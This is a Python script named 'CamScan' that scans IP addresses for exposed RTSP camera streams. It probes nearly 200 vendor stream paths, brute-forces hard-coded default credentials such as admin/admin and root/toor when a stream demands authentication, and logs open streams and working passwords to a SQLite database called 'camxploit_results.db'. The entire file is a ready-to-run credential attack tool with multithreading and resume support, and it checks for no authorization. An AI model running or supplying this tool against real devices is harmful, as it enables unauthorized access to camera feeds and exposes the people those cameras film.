import argparse
import base64
import ipaddress
import json
import os
import socket
import sqlite3
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from threading import Event, Lock
from typing import Callable, Dict, List, Optional, Set, Tuple

TIMEOUT = 5
RTSP_PORT = 554
REQUEST_USER_AGENT = "Cam-RTSP/1.0"

if sys.stdout.isatty():
    R = "\033[31m"  # Red
    G = "\033[32m"  # Green
    C = "\033[36m"  # Cyan
    W = "\033[0m"   # Reset
    Y = "\033[33m"  # Yellow
    M = "\033[35m"  # Magenta
    B = "\033[34m"  # Blue
else:
    R = G = C = W = Y = M = B = ""

BANNER = rf"""

Started
"""

DEFAULT_CREDENTIALS: Dict[str, List[str]] = {
    "admin": ["admin", "1234", "admin123", "password", "12345", "123456", "1111", "default", "1111111", "4321", "jvc", "fliradmin", "9999"],
    "root": ["root", "toor", "1234", "pass", "root123", "system", "admin", "Admin", "camera"],
    "user": ["user", "user123", "password"],
    "guest": ["guest", "guest123"],
    "operator": ["operator", "operator123"],
}

RTSP_PATHS: List[str] = [
    "/",
    "/0",
    "/0/video1",
    "/1",
    "/1.AMP",
    "/1/1:1/main",
    "/1/cif",
    "/1/stream1",
    "/11",
    "/12",
    "/4",
    "/CAM_ID.password.mp2",
    "/CH001.sdp",
    "/GetData.cgi",
    "/H264",
    "/HighResolutionVideo",
    "/HighResolutionvideo",
    "/Image.jpg",
    "/LowResolutionVideo",
    "/MJPEG.cgi",
    "/MediaInput/h264",
    "/MediaInput/h264/stream_1",
    "/MediaInput/mpeg4",
    "/ONVIF/MediaInput",
    "/ONVIF/channel1",
    "/PSIA/Streaming/channels/0?videoCodecType=H.264",
    "/PSIA/Streaming/channels/1",
    "/PSIA/Streaming/channels/1?videoCodecType=MPEG4",
    "/PSIA/Streaming/channels/h264",
    "/Possible",
    "/ROH/channel/11",
    "/Streaming/Channels/1",
    "/Streaming/Channels/101",
    "/Streaming/Channels/102",
    "/Streaming/Channels/103",
    "/Streaming/Channels/2",
    "/Streaming/Unicast/channels/101",
    "/Streaming/channels/101",
    "/Video?Codec=MPEG4&Width=720&Height=576&Fps=30",
    "/VideoInput/1/h264/1",
    "/access_code",
    "/access_name_for_stream_1_to_5",
    "/av0_0",
    "/av0_1",
    "/av2",
    "/avn=2",
    "/axis-media/media.amp",
    "/axis-media/media.amp?videocodec=h264&resolution=640x480",
    "/cam",
    "/cam/realmonitor",
    "/cam/realmonitor?channel=1&subtype=00",
    "/cam/realmonitor?channel=1&subtype=01",
    "/cam/realmonitor?channel=1&subtype=1",
    "/cam0_0",
    "/cam0_1",
    "/cam1/h264",
    "/cam1/h264/multicast",
    "/cam1/mjpeg",
    "/cam1/mpeg4",
    "/cam1/onvif-h264",
    "/cam4/mpeg4",
    "/camera.stm",
    "/cgi-bin/viewer/video.jpg?resolution=640x480",
    "/ch0",
    "/ch0.h264",
    "/ch001.sdp",
    "/ch01.264",
    "/ch0_0.h264",
    "/ch0_unicast_firststream",
    "/ch0_unicast_secondstream",
    "/channel1",
    "/dms.jpg",
    "/dms?nowprofileid=2",
    "/h264",
    "/h264.sdp",
    "/h264/ch1/sub/",
    "/h264/media.amp",
    "/h264Preview_01_main",
    "/h264Preview_01_sub",
    "/h264_vga.sdp",
    "/image.jpg",
    "/image.mpg",
    "/image/jpeg.cgi",
    "/img/media.sav",
    "/img/video.asf",
    "/img/video.sav",
    "/ioImage/1",
    "/ipcam.sdp",
    "/ipcam/stream.cgi?nowprofileid=2",
    "/ipcam_h264.sdp",
    "/jpg/image.jpg?size=3",
    "/live",
    "/live.sdp",
    "/live/av0",
    "/live/ch0",
    "/live/ch00_0",
    "/live/ch00_1",
    "/live/ch1",
    "/live/ch2",
    "/live/h264",
    "/live/mpeg4",
    "/live0.264",
    "/live1.264",
    "/live1.sdp",
    "/live2.sdp",
    "/live3.sdp",
    "/live_h264.sdp",
    "/live_mpeg4.sdp",
    "/livestream",
    "/livestream/",
    "/media",
    "/media.amp",
    "/media/media.amp",
    "/media/video1",
    "/media/video2",
    "/media/video3",
    "/medias1",
    "/mjpeg.cgi",
    "/mjpeg/media.smp",
    "/mp4",
    "/mpeg4",
    "/mpeg4/1/media.amp",
    "/mpeg4/media.amp",
    "/mpeg4/media.amp?resolution=640x480",
    "/mpeg4/media.smp",
    "/mpeg4cif",
    "/mpeg4unicast",
    "/mpg4/rtsp.amp",
    "/multicaststream",
    "/now.mp4",
    "/nph-h264.cgi",
    "/nphMpeg4/g726-640x",
    "/nphMpeg4/g726-640x480",
    "/nphMpeg4/nil-320x240",
    "/onvif-media/media.amp",
    "/onvif/live/2",
    "/onvif1",
    "/onvif2",
    "/play1.sdp",
    "/play2.sdp",
    "/profile",
    "/recognizer",
    "/rtpvideo1.sdp",
    "/rtsp_tunnel",
    "/rtsph264",
    "/rtsph2641080p",
    "/stream1",
    "/stream2",
    "/streaming/mjpeg",
    "/synthesizer",
    "/tcp/av0_0",
    "/ucast/11",
    "/unicast/c1/s1/live",
    "/user.pin.mp2",
    "/user_defined",
    "/video",
    "/video.3gp",
    "/video.cgi",
    "/video.cgi?resolution=VGA",
    "/video.cgi?resolution=vga",
    "/video.h264",
    "/video.mjpg",
    "/video.mp4",
    "/video.pro1",
    "/video.pro2",
    "/video.pro3",
    "/video/mjpg.cgi",
    "/video1",
    "/video1+audio1",
    "/video2.mjpg",
    "/videoMain",
    "/videoinput_1:0/h264_1/onvif.stm",
    "/videostream.cgi?rate=0",
    "/vis",
    "/wfov",
    "/user=admin_password=tlJwpbo6_channel=1_stream=0.sdp?real_stream",
]


class ScanAborted(Exception):
    """Raised when a scan should stop early due to a user request."""


class ScanLogger:
    def __init__(self) -> None:
        self._lines: List[str] = []

    def log(self, message: str) -> None:
        self._lines.append(message)

    @property
    def lines(self) -> List[str]:
        return self._lines


def load_ips_from_file(path: str) -> List[str]:
    ips: List[str] = []
    try:
        with open(path, "r", encoding="utf-8") as ip_file:
            for line in ip_file:
                stripped = line.strip()
                if not stripped or stripped.startswith("#"):
                    continue
                ips.append(stripped)
    except FileNotFoundError:
        print(f"{R}[!] IP list file not found: {path}{W}")
    except OSError as exc:
        print(f"{R}[!] Unable to read IP list file {path}: {exc}{W}")
    return ips


def validate_ip(target_ip: str) -> bool:
    try:
        ip = ipaddress.ip_address(target_ip)
        if ip.is_private:
            print(f"{Y}[!] Warning: Private IP address detected. Proceed with caution.{W}")
        return True
    except ValueError:
        print(f"{R}[!] Invalid IP address format: {target_ip}{W}")
        return False


def is_port_open(ip: str, port: int = RTSP_PORT) -> bool:
    try:
        with socket.create_connection((ip, port), timeout=TIMEOUT):
            return True
    except (socket.timeout, OSError):
        return False


def flatten_credentials() -> List[str]:
    combos: List[str] = []
    for username, passwords in DEFAULT_CREDENTIALS.items():
        for password in passwords:
            combo = f"{username}:{password}"
            if combo not in combos:
                combos.append(combo)
    return combos


def load_scanned_ips_from_db(db_path: str) -> Set[str]:
    if not os.path.exists(db_path):
        return set()
    try:
        with sqlite3.connect(db_path) as conn:
            cursor = conn.execute("SELECT DISTINCT ip FROM rtsp_scan_results")
            return {row[0] for row in cursor.fetchall() if row[0]}
    except sqlite3.Error as exc:
        print(f"{Y}[!] Unable to read previous scan results from {db_path}: {exc}{W}")
        return set()


def send_rtsp_describe(ip: str, port: int, path: str, credential: Optional[str] = None) -> Tuple[Optional[int], str]:
    normalized_path = path if path.startswith("/") else f"/{path}"
    url = f"rtsp://{ip}:{port}{normalized_path}"
    headers = [
        f"DESCRIBE {url} RTSP/1.0",
        "CSeq: 1",
        f"User-Agent: {REQUEST_USER_AGENT}",
        "Accept: application/sdp",
    ]
    if credential:
        token = base64.b64encode(credential.encode("utf-8")).decode("ascii")
        headers.append(f"Authorization: Basic {token}")
    request_data = "\r\n".join(headers) + "\r\n\r\n"

    try:
        with socket.create_connection((ip, port), timeout=TIMEOUT) as sock:
            sock.settimeout(TIMEOUT)
            sock.sendall(request_data.encode("utf-8"))
            response = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                except socket.timeout:
                    break
                if not chunk:
                    break
                response += chunk
                if b"\r\n\r\n" in response:
                    break
    except (socket.timeout, OSError) as exc:
        return None, f"socket error: {exc}"

    if not response:
        return None, "empty response"

    try:
        decoded = response.decode("utf-8", errors="ignore")
    except UnicodeDecodeError:
        decoded = response.decode("latin-1", errors="ignore")

    lines = decoded.splitlines()
    status_line = lines[0] if lines else ""
    parts = status_line.split()
    if len(parts) >= 2 and parts[1].isdigit():
        return int(parts[1]), decoded
    return None, decoded


def brute_force_rtsp_paths(
    ip: str,
    port: int,
    credentials: List[str],
    *,
    log: Optional[Callable[[str], None]] = None,
    stop_event: Optional[Event] = None,
) -> Tuple[List[Dict[str, object]], List[Dict[str, str]], List[Dict[str, object]]]:
    logger = log or print
    logger(f"\n{C}[🔍] Brute forcing RTSP paths on {ip}:{port}{W}")
    discovered: List[Dict[str, object]] = []
    credential_hits: List[Dict[str, str]] = []
    other_responses: List[Dict[str, object]] = []
    credentials_attempted_for_path: Dict[str, bool] = {}

    for index, path in enumerate(RTSP_PATHS, start=1):
        if stop_event and stop_event.is_set():
            logger(f"  {Y}[!] Stop requested. Aborting remaining path attempts on {ip}{W}")
            raise ScanAborted()
        url = f"rtsp://{ip}:{port}{path if path.startswith('/') else '/' + path}"
        status, response = send_rtsp_describe(ip, port, path)
        if status is None:
            logger(f"  {Y}[!] {path} -> no valid response ({response}){W}")
            other_responses.append({"url": url, "note": response})
            continue

        if status == 200:
            logger(f"  {G}[+] Discovered stream without auth: {url}{W}")
            discovered.append({"url": url, "requires_auth": False, "status": status})
        elif status == 401:
            #print(f"  {Y}[-] Authentication required for {url}{W}")
            if credentials_attempted_for_path.get(ip):
                continue
            logger(f"  {Y}[-] Trying creds")
            credentials_attempted_for_path[ip] = True
            found = False
            for credential in credentials:
                if stop_event and stop_event.is_set():
                    logger(f"  {Y}[!] Stop requested while attempting credentials on {ip}{W}")
                    raise ScanAborted()
                time.sleep(0.05)
                auth_status, _ = send_rtsp_describe(ip, port, path, credential=credential)
                if auth_status == 200:
                    logger(f"    {G}[+] Credentials succeeded ({credential}) for {url}{W}")
                    discovered.append({
                        "url": url,
                        "requires_auth": True,
                        "status": auth_status,
                        "credential": credential,
                    })
                    credential_hits.append({"url": url, "credential": credential})
                    found = True
                    break
                elif auth_status is None:
                    continue
            if not found:
                other_responses.append({"url": url, "status": 401})
        else:
            logger(f"  {M}[*] {url} -> status {status}{W}")
            other_responses.append({"url": url, "status": status})

        if index % 20 == 0:
            time.sleep(0.01)

    return discovered, credential_hits, other_responses


def save_results_to_db(db_path: str, results: Dict[str, object]) -> None:
    def to_json(value: Optional[object]) -> Optional[str]:
        if value is None:
            return None
        return json.dumps(value)

    with sqlite3.connect(db_path) as conn:
        conn.execute(
            """
            CREATE TABLE IF NOT EXISTS rtsp_scan_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT NOT NULL,
                timestamp TEXT NOT NULL,
                port_open INTEGER NOT NULL,
                discovered_paths TEXT,
                credential_hits TEXT,
                other_responses TEXT
            )
            """
        )
        conn.execute(
            """
            INSERT INTO rtsp_scan_results (
                ip,
                timestamp,
                port_open,
                discovered_paths,
                credential_hits,
                other_responses
            ) VALUES (?, ?, ?, ?, ?, ?)
            """,
            (
                results.get("ip"),
                results.get("timestamp"),
                1 if results.get("port_open") else 0,
                to_json(results.get("discovered_paths")),
                to_json(results.get("credential_hits")),
                to_json(results.get("other_responses")),
            ),
        )


def scan_target(
    target_ip: str,
    *,
    credentials: List[str],
    db_path: str,
    stop_event: Event,
    output_lock: Lock,
    position: int,
    total: int,
) -> None:
    logger = ScanLogger()
    if total > 1:
        logger.log(f"\n{M}=== Processing target {position}/{total}: {target_ip} ==={W}")
    else:
        logger.log(f"\n{M}=== Processing target: {target_ip} ==={W}")

    result: Dict[str, object] = {
        "ip": target_ip,
        "timestamp": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S"),
        "port_open": False,
        "discovered_paths": [],
        "credential_hits": [],
        "other_responses": [],
    }

    try:
        if stop_event.is_set():
            raise ScanAborted()

        if is_port_open(target_ip, RTSP_PORT):
            logger.log(f"{G}[+] Port {RTSP_PORT} is open on {target_ip}{W}")
            result["port_open"] = True
            discovered, creds, other = brute_force_rtsp_paths(
                target_ip,
                RTSP_PORT,
                credentials,
                log=logger.log,
                stop_event=stop_event,
            )
            result["discovered_paths"] = discovered
            result["credential_hits"] = creds
            result["other_responses"] = other
            if not discovered:
                logger.log(f"{Y}[-] No valid RTSP paths discovered on {target_ip}{W}")
        else:
            logger.log(f"{R}[-] Port {RTSP_PORT} is closed or unreachable on {target_ip}{W}")

        if stop_event.is_set():
            raise ScanAborted()

        save_results_to_db(db_path, result)
        logger.log(f"{C}[✅] Scan completed for {target_ip}{W}")
    except ScanAborted:
        logger.log(f"{Y}[!] Scan for {target_ip} aborted by user request.{W}")
        raise
    except Exception as exc:
        logger.log(f"{R}[!] Unexpected error while scanning {target_ip}: {exc}{W}")
        raise
    finally:
        with output_lock:
            for line in logger.lines:
                print(line)


def main() -> None:
    parser = argparse.ArgumentParser(
        description="CamScan - Targeted RTSP exposure scanner",
        epilog=f"Example: python {sys.argv[0]} 192.168.1.100",
    )
    parser.add_argument("target_ip", nargs="?", help="The IP address of the target camera to scan.")
    parser.add_argument("-f", "--ip-file", dest="ip_file", help="Path to a file containing IP addresses to scan.")
    parser.add_argument("--db-path", default="camxploit_results.db", help="Path to the SQLite database file.")
    parser.add_argument(
        "-t",
        "--threads",
        type=int,
        default=4,
        help="Number of concurrent scan threads to use (default: 4).",
    )
    parser.add_argument(
        "--resume",
        action="store_true",
        help="Skip targets that already exist in the database.",
    )
    args = parser.parse_args()

    if args.threads < 1:
        parser.error("Number of threads must be at least 1.")

    requested_targets: List[str] = []
    if args.target_ip:
        requested_targets.append(args.target_ip.strip())
    if args.ip_file:
        requested_targets.extend(load_ips_from_file(args.ip_file))

    if not requested_targets:
        parser.error("You must provide a target IP or an IP list file.")

    unique_targets: List[str] = []
    seen: Set[str] = set()
    for target in requested_targets:
        stripped = target.strip()
        if not stripped or stripped in seen:
            continue
        if not validate_ip(stripped):
            continue
        unique_targets.append(stripped)
        seen.add(stripped)

    if not unique_targets:
        print(f"{R}[!] No valid IP addresses to scan.{W}")
        return

    if args.resume:
        scanned_ips = load_scanned_ips_from_db(args.db_path)
        if scanned_ips:
            before = len(unique_targets)
            unique_targets = [ip for ip in unique_targets if ip not in scanned_ips]
            skipped = before - len(unique_targets)
            if skipped:
                print(f"{Y}[!] Skipping {skipped} target(s) already stored in {args.db_path}{W}")
            else:
                print(f"{C}[*] No matching completed scans found in {args.db_path}{W}")
        else:
            print(f"{C}[*] No existing scan entries found in {args.db_path}. Starting fresh.{W}")

    total_targets = len(unique_targets)
    if total_targets == 0:
        print(f"{G}[!] All requested targets have already been scanned.{W}")
        return

    print(BANNER)
    print("____________________________________________________________________________\n")
    print(f"{C}[💾] Results will be stored in: {args.db_path}{W}")
    if args.threads > 1:
        print(f"{C}[*] Running with up to {args.threads} concurrent scan threads.{W}")

    credentials = flatten_credentials()
    output_lock = Lock()
    stop_event = Event()

    future_to_ip: Dict[object, str] = {}

    try:
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            try:
                for position, target_ip in enumerate(unique_targets, start=1):
                    if stop_event.is_set():
                        break
                    future = executor.submit(
                        scan_target,
                        target_ip,
                        credentials=credentials,
                        db_path=args.db_path,
                        stop_event=stop_event,
                        output_lock=output_lock,
                        position=position,
                        total=total_targets,
                    )
                    future_to_ip[future] = target_ip

                for future in as_completed(future_to_ip):
                    if stop_event.is_set():
                        break
                    try:
                        future.result()
                    except ScanAborted:
                        continue
                    except Exception as exc:
                        with output_lock:
                            print(f"{R}[!] Scan task for {future_to_ip[future]} failed: {exc}{W}")
            except KeyboardInterrupt:
                stop_event.set()
                with output_lock:
                    print(f"\n{Y}[!] Stop requested. Waiting for running scans to finish...{W}")
                raise
    except KeyboardInterrupt:
        for future, ip in future_to_ip.items():
            try:
                future.result()
            except ScanAborted:
                continue
            except Exception as exc:
                with output_lock:
                    print(f"{R}[!] Scan task for {ip} failed: {exc}{W}")
        print(f"{Y}[!] Scan stopped before all targets were processed. Re-run with --resume to continue.{W}")


if __name__ == "__main__":
    main()

